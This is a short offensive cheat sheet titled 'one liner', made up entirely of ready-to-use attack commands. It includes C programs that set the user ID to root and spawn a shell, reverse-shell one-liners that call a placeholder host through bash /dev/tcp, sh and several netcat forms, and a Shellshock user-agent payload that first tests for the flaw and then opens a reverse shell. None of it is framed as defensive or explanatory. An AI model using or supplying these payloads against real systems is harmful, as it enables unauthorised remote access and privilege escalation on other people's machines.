# **one liner**

bin/bash:  
int main(void){  
  
setresuid(0, 0, 0);  
  
system("/bin/bash");  
  
}  
  
bin/sh:  
int main(void){  
  
setresuid(0, 0, 0);  
  
system("/bin/sh");  
  
}  
  
Reverse SHELL  
  
Bash  
Bash and TCP sockets  
bash -i >& /dev/tcp/x.x.x.x/6969 0>&1  
/bin/bash -i > /dev/tcp/x.x.x.x/6969 0<&1 2>&1  
  
sh and TCP sockets  
/bin/sh -i > /dev/tcp/x.x.x.x/6969 0<&1 2>&1  
  
Netcat  
nc -e /bin/sh x.x.x.x 6969  
nc -e cmd.exe x.x.x.x 6969  
/bin/sh | nc x.x.x.x 6969  
rm -f /tmp/p; mknod /tmp/p p && nc x.x.x.x 6969 0/tmp/p  
  
Shellshock reverse shell  
Verify vuln within http user-agent header:  
() { :; }; /bin/bash -c 'whoami'  
  
Spawn reverse shell:  
() { :; }; /bin/bash -c 'bash -i >& /dev/tcp/x.x.x.x/6969 0>&1;'